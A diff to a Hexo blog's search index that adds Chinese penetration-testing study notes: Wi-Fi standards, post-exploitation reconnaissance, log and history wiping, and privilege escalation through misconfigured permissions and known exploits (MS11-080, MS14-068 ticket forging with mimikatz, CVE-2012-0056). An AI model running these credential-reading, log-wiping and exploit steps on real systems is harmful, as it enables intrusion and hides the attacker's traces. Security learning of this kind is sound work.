@@ -4,11 +4,92 @@
   
     
     <entry>
+      <title>无线渗透</title>
+      <link href="/2020/09/23/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-IEEE-802-11%E6%A0%87%E5%87%86/"/>
+      <url>/2020/09/23/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-IEEE-802-11%E6%A0%87%E5%87%86/</url>
+      
+        <content type="html"><![CDATA[<h2 id="无线通信基础知识-IEEE-802-11标准"><a href="#无线通信基础知识-IEEE-802-11标准" class="headerlink" title="无线通信基础知识-IEEE 802.11标准"></a>无线通信基础知识-IEEE 802.11标准</h2><ul><li>无线技术特点<ul><li>行业迅猛发展</li><li>互联网重要入口</li><li>边界模糊</li><li>安全实施缺失而且困难</li><li>对技术不了解导致配置不当</li><li>企业网络私自接入AP破坏网络边界</li></ul></li></ul><a id="more"></a><h3 id="IEEE"><a href="#IEEE" class="headerlink" title="IEEE"></a>IEEE</h3><ul><li>Institute of Electrical and Electronics Engineers<ul><li>由通信航天生物电器电子等方面的科学家组成，目的是制定标准，知道行业发展。</li><li>IEEE分为不同的技术委员会（Committees），其中802委员会负责LAN、MAN标准的制定<ul><li>以太网</li><li>令牌环网</li><li>无线局域网</li><li>网桥</li></ul></li><li>IEEE 802.3是以太网，802.11是WLAN。标准只涉及数据链路层和物理层<ul><li>数据链路层<ul><li>逻辑链路控制子层LLC（802.2）</li><li>媒体访问控制子层MAC</li></ul></li></ul></li></ul></li></ul><h3 id="802-11标准"><a href="#802-11标准" class="headerlink" title="802.11标准"></a>802.11标准</h3><ul><li><p>发布于1997年</p></li><li><p>速率1或2Mbps</p></li><li><p>无线射频信号编码（调制）(radio frequencies)</p><ul><li>Direct-Sequence Spread-Spectrum(DSSS)直序扩频</li><li>Frequence Hopping Spread-Spectrum(FHSS)跳频扩频</li></ul></li><li><p>媒体访问方式——CSMA/CA</p><ul><li>根据算法侦听一定时长</li><li>发送数据包前发声明<ul><li>Request to Send/Clear to Send(RTS/CTS)</li></ul></li></ul></li><li><p>802委员会下第11组负责开发无线局域网标准</p></li><li><p>日常会涉及到的有a/b/g/n/i这几个标准</p></li></ul><h4 id="802-11b"><a href="#802-11b" class="headerlink" title="802.11b"></a>802.11b</h4><ul><li><p>Complementary Code Keying(CCK) 补码键控</p><ul><li>5.5 and 11Mbit/s</li><li>2.4GHz band(2.4GHz-2.485GHz)</li><li>14个重叠的信道 channels</li><li>每个信道22MHz带宽</li><li>只有三个完全不重叠的信道</li></ul></li><li><p>美国 1-11（2.412GHz-2.462GHz）</p></li><li><p>欧洲 1-13（2.412GHz-2.472GHz）</p><p>日本 1-14（2.412GHz-2.484GHz）</p></li></ul><h4 id="802-11a"><a href="#802-11a" class="headerlink" title="802.11a"></a>802.11a</h4><ul><li>与802.11b几乎同时发布<ul><li>因设备价格问题一直没有得到广泛使用</li><li>使用5GHz带宽<ul><li>2.4GHz带宽干扰源多(微波、蓝牙、无绳电话)</li><li>5GHz频率有更多带宽空间，可容纳更多不重叠的信道</li><li>Orthogonal Frequency-Division Multiplexing(OFDM)信号调制方法<ul><li>正交频分复用（802.11b是直序扩频和跳频扩频）</li></ul></li><li>更高速率54Mbps,每个信道20MHz带宽</li><li>变频<ul><li>5.15-5.35GHz</li><li>5.7-5.8GHz</li></ul></li></ul></li></ul></li></ul><h4 id="802-11G"><a href="#802-11G" class="headerlink" title="802.11G"></a>802.11G</h4><ul><li>2.4GHz频率</li><li>Ortheognal Frequency-Division Multiplexing(OFDM)信号调制方法</li><li>与802.11a信速率相同</li><li>可全局降速，向后兼容802.11b,并切换为CCK信号调制方法</li><li>每个信道20/22MHz带宽</li></ul><h4 id="802-11N"><a href="#802-11N" class="headerlink" title="802.11N"></a>802.11N</h4><ul><li>2.4或5GHz频率<ul><li>300Mbps最高600Mbps</li><li>Multiple-Input Multiple-Output(MIMO)多进多出通信技术</li><li>多天线，多无线电波，独立收发信号</li><li>可以使用40MHz信道带宽，使数据传输速率翻倍</li></ul></li><li>全802.11n设备网络中，可以使用新报文格式，使速率达到最大</li><li>每个信道20/40MHz带宽</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>敏感信息收集与隐藏痕迹</title>
+      <link href="/2020/09/23/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E9%9A%90%E8%97%8F%E7%97%95%E8%BF%B9/"/>
+      <url>/2020/09/23/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E9%9A%90%E8%97%8F%E7%97%95%E8%BF%B9/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><h3 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><ul><li><p>Linux</p><ul><li><table><thead><tr><th>查看信息</th><th>操作</th><th>备注</th></tr></thead><tbody><tr><td>DNS配置</td><td>/etc/resolv.conf</td><td>是否有机会DNS篡改，劫持</td></tr><tr><td>用户账号</td><td>/etc/passwd</td><td></td></tr><tr><td>用户密码</td><td>/etc/shadow</td><td></td></tr><tr><td>当前用户</td><td><code>whoami</code></td><td></td></tr><tr><td>所有登陆用户</td><td><code>who -a</code></td><td></td></tr><tr><td>网卡信息</td><td><code>ifconfig -a</code></td><td></td></tr><tr><td>防火墙设置</td><td><code>iptables -L -n</code></td><td></td></tr><tr><td>路由表</td><td><code>netstat -rn</code></td><td></td></tr><tr><td>操作系统信息</td><td><code>uname -a</code></td><td></td></tr><tr><td>当前运行的进程</td><td><code>ps aux</code></td><td></td></tr><tr><td>安装的软件包</td><td><code>dpkg -l</code></td><td></td></tr></tbody></table></li><li><p>查看,查看,查看</p></li><li><p>,ps aux</p></li><li><p>dpkg -l</p></li></ul></li><li><p>Windows</p><ul><li><table><thead><tr><th>查看信息</th><th>操作</th><th>备注</th></tr></thead><tbody><tr><td>ip掩码网关等</td><td>ipconfig /all</td><td></td></tr><tr><td>dns缓存</td><td>ipconfig /displaydns</td><td></td></tr><tr><td>开放端口及可执行程序</td><td>netstat -bano</td><td></td></tr><tr><td>路由表</td><td>netstat -r</td><td></td></tr><tr><td>共享</td><td>net view</td><td></td></tr><tr><td>共享</td><td>net view /domain</td><td></td></tr><tr><td>域信息</td><td>net user /domain</td><td></td></tr><tr><td>域信息</td><td>net usr %username% /domain</td><td></td></tr><tr><td>密码策略</td><td>net accounts</td><td></td></tr><tr><td>共享目录</td><td>net share</td><td></td></tr><tr><td>操作：把用户加入管理员组</td><td>net localgroup administrators username /add</td><td></td></tr><tr><td>域控制器主机</td><td>net group “Domain Controllers” /domain</td><td></td></tr><tr><td>操作：开共享</td><td>net share name$=C:/unlimited</td><td></td></tr><tr><td>操作：启动锁定账号</td><td>net user username /active:yes /domain</td><td></td></tr></tbody></table></li></ul></li></ul><h3 id="WMIC-Windows-Management-instrumentation"><a href="#WMIC-Windows-Management-instrumentation" class="headerlink" title="WMIC(Windows Management instrumentation)"></a>WMIC(Windows Management instrumentation)</h3><ul><li>被powershell的Get-WmiObject取代</li><li>Get-WmiObject又被Get-CimInstance取代</li><li>了解下Get-CimInstance</li><li>功能示例：<ul><li>查看网络登陆记录</li><li>查看当前进程，什么程序通过什么命令执行的进程</li><li>结束一个进程</li><li>查看操作系统安装的软件</li><li>静默删除软件</li><li>查看共享文件夹</li><li>开启“允许远程桌面”</li></ul></li></ul><h3 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h3><ul><li>商业信息</li><li>系统信息</li><li>Linux<ul><li>/etc;/usr/local/etc</li><li>/etc/passed;/etc/shadow</li><li>.ssh;.gnupg 公私钥</li><li>邮件和数据文件</li><li>业务数据库,身份认证服务器数据库</li><li>/tmp</li></ul></li><li>Windows<ul><li>SAM数据库；注册表文件</li><li>%SYSTEMROOT%\repair\SAM</li><li>%SYSTEMROOT%\System32\config\Regback\SAM</li><li>业务数据库，身份认证数据库</li><li>临时文件目录<ul><li>UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</li></ul></li></ul></li></ul><h3 id="隐藏痕迹"><a href="#隐藏痕迹" class="headerlink" title="隐藏痕迹"></a>隐藏痕迹</h3><ul><li><p>Windows</p><ul><li>禁止在登录界面显示新建账号<ul><li>reg add 添加注册表项</li></ul></li><li>del %WINDIR%*.log /a/s/q/f</li></ul></li><li><p>Linux</p><ul><li><p>history</p><ul><li>history -c</li><li>rm .bash_history&amp;&amp;touch .bash_history&amp;&amp;chattr +i .bash_history</li></ul></li><li><p>/var/log/</p><ul><li>auth.log或secure  (REH)</li><li>btmp 或 wtmp 文件(命令：last或lastb)</li><li>lastlog和faillog命令</li></ul></li><li><p>其它日志和HIDS等</p></li></ul></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>Ubuntu网络更新源已经不可用，可以先mount安装光盘<code></code>，此时/etc/apt/sources.list会自动添加光盘为更新源，此时再安装软件包，如果光盘中有就可以成功安装。</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>scp</p><p>lsattr</p><p>chattr</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>提权-利用配置不当提权</title>
+      <link href="/2020/09/23/%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/"/>
+      <url>/2020/09/23/%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</url>
+      
+        <content type="html"><![CDATA[<h2 id="提权-利用配置不当提权"><a href="#提权-利用配置不当提权" class="headerlink" title="提权-利用配置不当提权"></a>提权-利用配置不当提权</h2><ul><li><p>与漏洞提权相比 更常用的方法</p><ul><li>企业环境</li><li>补丁更新全部已经安装</li><li>输入变量过滤之外更值得研发关注的安全隐患</li></ul></li></ul><a id="more"></a><h3 id="文件读写权限"><a href="#文件读写权限" class="headerlink" title="文件读写权限"></a>文件读写权限</h3><p>如果：</p><ul><li>以system/root权限启动</li><li>NTFS权限允许user修改删除</li></ul><p>那么：</p><ul><li><p>可以用自己的反弹shell，替换服务中的可执行程序</p></li><li><p>或者写一个把当前用户添加到管理员组的Cpp,编译成exe，替换某个程序。当管理员运行该程序时，提权成功。</p></li><li><p>Windows:icacls</p><ul><li><code>icacls c:\windows\\*.exe /save asd /T</code> 查看C:\windows下所有exe的权限</li><li>icacls具体使用方法去搜索</li></ul></li><li><p>Linux:find</p><ul><li><code>find / -perm 777 -exec ls -l {} \;</code></li></ul></li></ul><h3 id="应用系统的配置文件"><a href="#应用系统的配置文件" class="headerlink" title="应用系统的配置文件"></a>应用系统的配置文件</h3><ul><li>如果应用需要连接数据库，那么它的配置文件中很有可能有数据库的账号密码信息</li><li>后台服务运行账号应使用nobody等单独的账号。如果是root,那么通过服务漏洞进入系统直接就是root权限。</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>提权-利用漏洞提权</title>
       <link href="/2020/09/22/%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/"/>
       <url>/2020/09/22/%E6%8F%90%E6%9D%83-%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/</url>
       
-        <content type="html"><![CDATA[<h2 id="提权-利用漏洞提权"><a href="#提权-利用漏洞提权" class="headerlink" title="提权-利用漏洞提权"></a>提权-利用漏洞提权</h2><h2 id="Ms11-080"><a href="#Ms11-080" class="headerlink" title="Ms11-080"></a>Ms11-080</h2><ul><li><p>Kb2592799</p><ul><li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li></ul></li><li><p>先把python编译成exe，再在目标机器执行</p><a id="more"></a><ul><li><a href="https://pypi.org/project/pywin32/" target="_blank" rel="noopener">https://pypi.org/project/pywin32/</a> (pyinstaller会调用pywin32)</li><li>pyinstaller.org</li></ul></li></ul><figure class="hljs highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit ms11-080<br>cp /usr/share/exploitdb/exploits/windows/local/18176.py .<br></code></pre></td></tr></table></figure><ul><li>如果目标机器有python环境，直接执行就可以。</li></ul><h2 id="Ms14-068"><a href="#Ms14-068" class="headerlink" title="Ms14-068"></a>Ms14-068</h2><ul><li><p>从本机管理员权限获取域管理员权限</p></li><li><ol><li><code>searchsploit ms14-068</code>得到35474.py</li><li><code>cp /usr/share/exploitdb/exploits/windows/remote/35474.py ~/ms14-068.py</code></li><li>在windows通过kali /usr/share/windows-resources/binaries/whoami.exe得到域用户的sid，还需要域控制器的ip。</li><li>使用漏洞利用代码生成TGT票据（kerbros协议的票据）<ul><li><code>python ms14-068.py -u u1@lab.com -s S-1-5-21-1226907004-2355705551-2341087478-1109 -d 192.168.0.119</code></li><li>输入u1域用户的密码</li></ul><ol start="5"><li>拷贝票据到windows系统</li></ol></li><li>通过minikatz完成提权<ul><li><code>kerberos::ptc TGT_u1@lab.com.ccache</code> </li></ul></li><li>发现可以访问域控制器的C盘</li></ol><ul><li>如果kali缺少python库文件，下载地址：<a href="https://github.com/bidord/pykek" target="_blank" rel="noopener">https://github.com/bidord/pykek</a></li></ul></li></ul><h2 id="其它："><a href="#其它：" class="headerlink" title="其它："></a>其它：</h2><p>Ms08-067</p><p>Ms09-001</p><p>Ms10-017</p><p>Ms12-020</p><h3 id="Kali修改默认python为python3"><a href="#Kali修改默认python为python3" class="headerlink" title="Kali修改默认python为python3"></a>Kali修改默认python为python3</h3><figure class="hljs highlight plain"><figcaption><span>/usr/bin/python```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rm"><br>&#96;&#96;&#96;ln -s &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;python<br></code></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<h2 id="提权-利用漏洞提权"><a href="#提权-利用漏洞提权" class="headerlink" title="提权-利用漏洞提权"></a>提权-利用漏洞提权</h2><h2 id="Ms11-080"><a href="#Ms11-080" class="headerlink" title="Ms11-080"></a>Ms11-080</h2><ul><li><p>Kb2592799</p><ul><li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li></ul></li><li><p>先把python编译成exe，再在目标机器执行</p><a id="more"></a><ul><li><a href="https://pypi.org/project/pywin32/" target="_blank" rel="noopener">https://pypi.org/project/pywin32/</a> (pyinstaller会调用pywin32)</li><li>pyinstaller.org</li></ul></li></ul><figure class="hljs highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit ms11-080<br>cp /usr/share/exploitdb/exploits/windows/local/18176.py .<br></code></pre></td></tr></table></figure><ul><li>如果目标机器有python环境，直接执行就可以。</li></ul><h2 id="Ms14-068"><a href="#Ms14-068" class="headerlink" title="Ms14-068"></a>Ms14-068</h2><ul><li><p>从本机管理员权限获取域管理员权限</p></li><li><ol><li><code>searchsploit ms14-068</code>得到35474.py</li><li><code>cp /usr/share/exploitdb/exploits/windows/remote/35474.py ~/ms14-068.py</code></li><li>在windows通过kali /usr/share/windows-resources/binaries/whoami.exe得到域用户的sid，还需要域控制器的ip。</li><li>使用漏洞利用代码生成TGT票据（kerbros协议的票据）<ul><li><code>python ms14-068.py -u u1@lab.com -s S-1-5-21-1226907004-2355705551-2341087478-1109 -d 192.168.0.119</code></li><li>输入u1域用户的密码</li></ul><ol start="5"><li>拷贝票据到windows系统</li></ol></li><li>通过minikatz完成提权<ul><li><code>kerberos::ptc TGT_u1@lab.com.ccache</code> </li></ul></li><li>发现可以访问域控制器的C盘</li></ol><ul><li>如果kali缺少python库文件，下载地址：<a href="https://github.com/bidord/pykek" target="_blank" rel="noopener">https://github.com/bidord/pykek</a></li></ul></li></ul><h2 id="CVE-2012-0056"><a href="#CVE-2012-0056" class="headerlink" title="CVE-2012-0056"></a>CVE-2012-0056</h2><ul><li><p>CVE-2012-0056</p><ul><li>/proc/pid/mem</li><li>kernels&gt;=2.6.39</li><li><a href="http://blog.zx2c4.com/749" target="_blank" rel="noopener">http://blog.zx2c4.com/749</a></li></ul></li><li><p>Ubuntu11.10</p><ul><li><a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10/</a></li></ul></li><li><p>gcc</p><ul><li><code>sudo apt-cdrom add</code>把光盘作为apt的更新源 </li><li><code>sudo apt-get install gcc</code></li><li><code>gcc 18411.c -o exp</code></li></ul></li><li><p>首先searchesploit 18411.c 找到文件位置 <code>/usr/share/exploitdb/exploits/linux/local</code></p></li><li><p>scp /usr/share/exploitdb/exploits/linux/local/18411.c <a href="mailto:flower@192.168.0.110">flower@192.168.0.110</a>:/home/flower</p></li><li><p>gcc编译好后，直接执行./exp，发现命令提示符$变为#，提权成功。</p></li></ul><h2 id="其它："><a href="#其它：" class="headerlink" title="其它："></a>其它：</h2><p>Ms08-067</p><p>Ms09-001</p><p>Ms10-017</p><p>Ms12-020</p><h3 id="Kali修改默认python为python3"><a href="#Kali修改默认python为python3" class="headerlink" title="Kali修改默认python为python3"></a>Kali修改默认python为python3</h3><figure class="hljs highlight plain"><figcaption><span>/usr/bin/python```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rm"><br>&#96;&#96;&#96;ln -s &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;python<br></code></pre></td></tr></table></figure>]]></content>
       
       
       <categories>
@@ -665,6 +746,33 @@
     
     
     <entry>
+      <title>在Hexo文章中插入图片</title>
+      <link href="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
+      <url>/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
+      
+        <content type="html"><![CDATA[<p>在写上一篇博客的时候，发现不知道该怎么往文章中插入图片，于是在网上搜。答案来来回回就那么两篇。于是就打开一个照着步骤做。</p><a id="more"></a><p>然后在操作的过程中，踩到了各种奇奇怪怪的坑。<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic01.jpg" alt><br>汪的一声就哭了<br>虽然在自己的不懈努力下<br>最后终于显示成功了。<br>可是，你不就一个低画质表情包吗！为什么显示这么大！！<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic02.jpg" alt><br>觉得可能是hexo主题的问题。既然这样，只能修改CSS。可是主题CSS一改，所有图片的样式都会受到影响。<br>在一番搜索过后，发现hexo可以直接使用img标签,在要添加图片的md文件所在的位置创建一个同名文件夹，把图片放在里面。然后把样式写在img标签里面。<br>すると：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img src&#x3D;&quot;&#x2F;pic02.jpg&quot; alt&#x3D;&quot;&quot; style&#x3D;&quot;width:100px;height:100px&quot;&gt;<br></code></pre></td></tr></table></figure><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic02.jpg" alt style="width:100px;height:100px"><p>完美解决问题。当然，我的第一种插入图片方法只需要下面这几步。</p><ol><li><p>安装插件</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install hexo-asset-image --save<br></code></pre></td></tr></table></figure></li><li><p>在要添加图片的md文件所在的位置创建一个同名文件夹，把图片放在里面。</p></li><li><p>在md文件中使用 !(图片描述)[xxx.png]</p></li><li><p>hexo g -d 重新发布</p></li></ol><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic04.jpg" alt style="width:100px;height:100px;float:left;display:block"><p>如果出了意外，那就去Google吧。。</p><p> 顺便，在我不断地重新发布并查看页面的时候。明明源码已经修改过来，可是网页上显示的页面还是不变。一定是缓存的问题。于是我清空浏览器缓存，果真OK了。</p><p> 可是！每次调试都要清缓存真的好麻烦。。。<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic03.jpg" alt style="width:100px;height:100px" align="right"><br> 好在我发现了ctrl+F5 这个清缓存刷新的神奇快捷键。。。<br> 如果有遇到需要经常清缓存刷新的，这样方便多了。。<br>nice，插入图片已经不是问题了。<br>顺便,👇用这种方法可以把图片显示在文字右边，就像这样👉</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img src&#x3D;&quot;&#x2F;pic03.jpg&quot; alt&#x3D;&quot;&quot; style&#x3D;&quot;width:100px;height:100px&quot; align&#x3D;&quot;right&quot;&gt;<br></code></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络运维 </category>
+          
+          <category> Hexo </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Java中二维数组的复制（深拷贝与浅拷贝）</title>
       <link href="/2018/08/30/Java%E4%B8%AD%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%8D%E5%88%B6%EF%BC%88%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/"/>
       <url>/2018/08/30/Java%E4%B8%AD%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%8D%E5%88%B6%EF%BC%88%E6%B7%B1%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/</url>
@@ -686,33 +794,6 @@
             <tag> Java </tag>
             
             <tag> 函数 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>在Hexo文章中插入图片</title>
-      <link href="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
-      <url>/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
-      
-        <content type="html"><![CDATA[<p>在写上一篇博客的时候，发现不知道该怎么往文章中插入图片，于是在网上搜。答案来来回回就那么两篇。于是就打开一个照着步骤做。</p><a id="more"></a><p>然后在操作的过程中，踩到了各种奇奇怪怪的坑。<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic01.jpg" alt><br>汪的一声就哭了<br>虽然在自己的不懈努力下<br>最后终于显示成功了。<br>可是，你不就一个低画质表情包吗！为什么显示这么大！！<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic02.jpg" alt><br>觉得可能是hexo主题的问题。既然这样，只能修改CSS。可是主题CSS一改，所有图片的样式都会受到影响。<br>在一番搜索过后，发现hexo可以直接使用img标签,在要添加图片的md文件所在的位置创建一个同名文件夹，把图片放在里面。然后把样式写在img标签里面。<br>すると：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img src&#x3D;&quot;&#x2F;pic02.jpg&quot; alt&#x3D;&quot;&quot; style&#x3D;&quot;width:100px;height:100px&quot;&gt;<br></code></pre></td></tr></table></figure><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic02.jpg" alt style="width:100px;height:100px"><p>完美解决问题。当然，我的第一种插入图片方法只需要下面这几步。</p><ol><li><p>安装插件</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cnpm install hexo-asset-image --save<br></code></pre></td></tr></table></figure></li><li><p>在要添加图片的md文件所在的位置创建一个同名文件夹，把图片放在里面。</p></li><li><p>在md文件中使用 !(图片描述)[xxx.png]</p></li><li><p>hexo g -d 重新发布</p></li></ol><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic04.jpg" alt style="width:100px;height:100px;float:left;display:block"><p>如果出了意外，那就去Google吧。。</p><p> 顺便，在我不断地重新发布并查看页面的时候。明明源码已经修改过来，可是网页上显示的页面还是不变。一定是缓存的问题。于是我清空浏览器缓存，果真OK了。</p><p> 可是！每次调试都要清缓存真的好麻烦。。。<br><img src="/2018/08/30/%E5%9C%A8Hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/pic03.jpg" alt style="width:100px;height:100px" align="right"><br> 好在我发现了ctrl+F5 这个清缓存刷新的神奇快捷键。。。<br> 如果有遇到需要经常清缓存刷新的，这样方便多了。。<br>nice，插入图片已经不是问题了。<br>顺便,👇用这种方法可以把图片显示在文字右边，就像这样👉</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;img src&#x3D;&quot;&#x2F;pic03.jpg&quot; alt&#x3D;&quot;&quot; style&#x3D;&quot;width:100px;height:100px&quot; align&#x3D;&quot;right&quot;&gt;<br></code></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> 网络运维 </category>
-          
-          <category> Hexo </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Hexo </tag>
             
         </tags>
       
